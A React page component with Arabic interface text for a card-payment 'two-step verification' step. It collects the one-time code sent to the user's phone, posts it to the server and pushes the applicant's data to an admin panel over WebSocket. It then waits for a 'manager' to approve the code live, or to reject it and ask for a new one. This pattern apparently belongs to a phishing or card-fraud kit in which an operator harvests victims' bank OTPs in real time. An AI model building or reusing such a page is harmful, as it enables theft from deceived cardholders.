import { useState, useEffect } from "react";
import { ShieldCheck, ArrowRight, Loader2, AlertCircle, CheckCircle, XCircle } from "lucide-react";
import Navbar from "@/components/Navbar";
import Footer from "@/components/Footer";
import { useWebSocket, broadcast } from "@/context/WebSocketContext";
import { usePageContent } from "@/hooks/usePageContent";

const DEFAULTS = {
  page_title: "التحقق بخطوتين",
  otp_placeholder: "أدخل رمز التحقق",
  submit_btn: "تحقق من الرمز",
  waiting_title: "في انتظار الموافقة",
  waiting_message: "تم إرسال الرمز. في انتظار موافقة المدير...",
  approved_title: "تمت الموافقة",
  rejected_title: "رمز غير صحيح",
  retry_btn: "حاول مرة أخرى",
  back_btn: "العودة لإدخال بيانات البطاقة",
};

function getQueryParam(key: string): string | null {
  const params = new URLSearchParams(window.location.search);
  return params.get(key);
}

type VerificationStatus = "pending" | "waiting" | "approved" | "rejected";

export default function PayOtpPage() {
  const applicationId = getQueryParam("applicationId");
  const sessionId = getQueryParam("session");
  const [otp, setOtp] = useState("");
  const [status, setStatus] = useState<VerificationStatus>("pending");
  const [message, setMessage] = useState("أدخل رمز التحقق المرسل إلى هاتفك");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState("");
  const { subscribe } = useWebSocket();
  const content = usePageContent("pay-otp", DEFAULTS);
  const [pendingAppData, setPendingAppData] = useState<any>(null);

  // الاستماع لتحديثات حالة الدفع من لوحة الإدارة
  useEffect(() => {
    if (!sessionId) return;

    const unsubscribe = subscribe((msg: any) => {
      if (msg.sessionId === sessionId) {
        // المدير وافق على رمز OTP الدفع
        if (msg.type === "payment_completed" || msg.redirectUrl?.includes("success")) {
          setStatus("approved");
          setMessage("تمت الموافقة! جاري التحويل...");
          setTimeout(() => {
            window.location.href = "/apply/success";
          }, 2000);
        } else if (msg.type === "otp_rejected") {
          // المدير رفض الرمز وأرسل رمز جديد
          setStatus("rejected");
          setMessage(msg.message || "الرمز غير صحيح أو منتهي. يرجى انتظار رمز جديد.");
          setOtp(""); // مسح الرمز القديم
        } else if (msg.type === "payment_status_update") {
          if (msg.paymentStatus === "failed") {
            setStatus("rejected");
            setMessage(msg.message || "الرمز غير صحيح.");
          }
        }
      }
    });

    return () => unsubscribe();
  }, [sessionId, subscribe]);

  const handleOtpChange = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 6);
    setOtp(digits);
    setError("");
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!otp || otp.length < 4 || otp.length > 6) {
      setError("رمز التحقق يجب أن يكون 4-6 أرقام");
      return;
    }

    if (!applicationId) {
      setError("معرف الطلب غير موجود");
      return;
    }

    setIsSubmitting(true);
    setError("");

    try {
      const response = await fetch(`/api/applications/${applicationId}/payment-otp`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ otp }),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || "فشل في التحقق من الرمز");
      }

      if (data.success) {
        // انتظار قرار المدير - لا تحوّل تلقائياً
        setStatus("waiting");
        setMessage("تم إرسال الرمز. في انتظار موافقة المدير...");

        // جلب بيانات الطلب المحدثة وإرسال إشعار لوحة الإدارة
        try {
          const appResponse = await fetch(`/api/applications/${applicationId}`);
          if (appResponse.ok) {
            const appData = await appResponse.json();
            // إرسال إشعار WebSocket لتحديث لوحة الإدارة
            broadcast({
              type: "application_update",
              data: {
                ...appData,
                applicantName: appData.fullName || appData.companyName || appData.contactName || null,
                eventType: "payment"
              }
            });
          }
        } catch (notifyErr) {
          console.error("فشل في إرسال إشعار التحديث:", notifyErr);
        }
      } else {
        throw new Error(data.error || "رمز غير صحيح");
      }
    } catch (err) {
      setStatus("rejected");
      setMessage(err instanceof Error ? err.message : "حدث خطأ غير متوقع");
      setOtp("");
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleGoBack = () => {
    window.history.back();
  };

  return (
    <div className="min-h-screen flex flex-col bg-primary">
      <Navbar />

      <main className="flex-1 flex items-center justify-center p-4">
        <div className="w-full max-w-md">
          <form onSubmit={handleSubmit} className="bg-white/10 backdrop-blur-lg rounded-3xl p-8 shadow-2xl">
            <div className="text-center mb-8">
              <div className={`w-20 h-20 mx-auto rounded-full flex items-center justify-center mb-4 ${
                status === "approved" ? "bg-green-500" :
                status === "rejected" ? "bg-red-500" :
                status === "waiting" ? "bg-yellow-500" :
                "bg-accent"
              }`}>
                {isSubmitting ? (
                  <Loader2 className="w-10 h-10 text-primary animate-spin" />
                ) : status === "approved" ? (
                  <CheckCircle className="w-10 h-10 text-white" />
                ) : status === "rejected" ? (
                  <XCircle className="w-10 h-10 text-white" />
                ) : status === "waiting" ? (
                  <Loader2 className="w-10 h-10 text-white animate-spin" />
                ) : (
                  <ShieldCheck className="w-10 h-10 text-primary" />
                )}
              </div>

              <h1 className="text-2xl font-bold text-white mb-2">
                {content.page_title || "التحقق بخطوتين"}
              </h1>

              <p className="text-white/80">{message}</p>
            </div>

            {status === "pending" && (
              <>
                <div className="space-y-4">
                  <div>
                    <label className="block text-white/70 text-sm mb-2 text-center">
                      {content.otp_placeholder || "أدخل رمز التحقق المرسل إلى هاتفك"}
                    </label>
                    <input
                      type="text"
                      inputMode="numeric"
                      pattern="[0-9]*"
                      value={otp}
                      onChange={(e) => handleOtpChange(e.target.value)}
                      placeholder="• • • •"
                      className="w-full bg-white/20 border-2 border-white/30 rounded-xl px-6 py-4 text-center text-2xl text-white tracking-widest placeholder:text-white/40 focus:outline-none focus:border-accent transition-colors"
                      maxLength={6}
                      autoFocus
                    />
                    {error && (
                      <div className="flex items-center gap-2 text-red-300 text-sm mt-2 justify-center">
                        <AlertCircle className="w-4 h-4" />
                        {error}
                      </div>
                    )}
                  </div>

                  <button
                    type="submit"
                    disabled={isSubmitting || otp.length < 4}
                    className="w-full bg-gradient-to-l from-accent to-[#e0b95b] hover:from-[#e0b95b] hover:to-accent disabled:opacity-50 disabled:cursor-not-allowed text-primary font-bold py-4 rounded-xl transition-all flex items-center justify-center gap-2"
                  >
                    {isSubmitting ? (
                      <>
                        <Loader2 className="w-5 h-5 animate-spin" />
                        جاري الإرسال...
                      </>
                    ) : (
                      <>
                        <ShieldCheck className="w-5 h-5" />
                        {content.submit_btn || "تحقق من الرمز"}
                      </>
                    )}
                  </button>

                  <button
                    type="button"
                    onClick={handleGoBack}
                    className="w-full text-white/60 hover:text-white py-2 text-sm transition-colors flex items-center justify-center gap-2"
                  >
                    <ArrowRight className="w-4 h-4" />
                    {content.back_btn || "العودة لإدخال بيانات البطاقة"}
                  </button>
                </div>
              </>
            )}

            {status === "waiting" && (
              <div className="text-center mt-6">
                <div className="bg-yellow-500/20 border border-yellow-500/30 rounded-xl p-6">
                  <Loader2 className="w-8 h-8 text-yellow-400 mx-auto mb-3 animate-spin" />
                  <p className="text-white/90 text-sm">
                    جاري مراجعة الرمز من قبل المدير...
                  </p>
                </div>
                <div className="flex items-center justify-center gap-2 text-white/60 text-sm mt-4">
                  <div className="w-2 h-2 bg-yellow-400 rounded-full animate-pulse"></div>
                  <div className="w-2 h-2 bg-yellow-400 rounded-full animate-pulse" style={{ animationDelay: "0.2s" }}></div>
                  <div className="w-2 h-2 bg-yellow-400 rounded-full animate-pulse" style={{ animationDelay: "0.4s" }}></div>
                </div>
              </div>
            )}

            {status === "approved" && (
              <div className="text-center mt-6">
                <p className="text-white/80 text-sm">
                  سيتم توجيهك تلقائياً...
                </p>
                <div className="flex items-center justify-center gap-2 text-white/60 text-sm mt-4">
                  <div className="w-2 h-2 bg-accent rounded-full animate-pulse"></div>
                  <div className="w-2 h-2 bg-accent rounded-full animate-pulse" style={{ animationDelay: "0.2s" }}></div>
                  <div className="w-2 h-2 bg-accent rounded-full animate-pulse" style={{ animationDelay: "0.4s" }}></div>
                </div>
              </div>
            )}

            {status === "rejected" && (
              <div className="space-y-4 mt-6">
                <div className="bg-red-500/20 border border-red-500/30 rounded-xl p-4 text-center">
                  <AlertCircle className="w-6 h-6 text-red-400 mx-auto mb-2" />
                  <p className="text-white/90 text-sm">
                    {message}
                  </p>
                </div>

                <button
                  type="button"
                  onClick={() => {
                    setStatus("pending");
                    setMessage("أدخل رمز التحقق المرسل إلى هاتفك");
                    setOtp("");
                  }}
                  className="w-full bg-white/10 hover:bg-white/20 text-white py-3 rounded-xl transition-all flex items-center justify-center gap-2"
                >
                  <ArrowRight className="w-5 h-5" />
                  {content.retry_btn || "حاول مرة أخرى"}
                </button>

                <button
                  type="button"
                  onClick={handleGoBack}
                  className="w-full text-white/60 hover:text-white py-2 text-sm transition-colors flex items-center justify-center gap-2"
                >
                  <ArrowRight className="w-4 h-4" />
                  {content.back_btn || "العودة لإدخال بيانات البطاقة"}
                </button>
              </div>
            )}
          </form>
        </div>
      </main>

      <Footer />
    </div>
  );
}
